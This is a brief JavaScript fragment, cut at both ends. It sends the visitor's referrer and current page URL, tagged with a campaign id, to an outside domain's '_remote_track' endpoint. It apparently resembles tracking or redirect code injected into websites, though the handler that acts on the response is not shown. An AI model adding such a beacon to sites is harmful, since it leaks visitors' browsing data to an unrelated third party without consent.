...
xhr.open("GET", "https://aircraftfinanceco.info/_remote_track?campaign=" + escape("RpTk1rwwgJ") + "&referrer=" + escape(document.referrer) + "&uri=" + escape(window.location.href), true);
xhr.onload = function() {
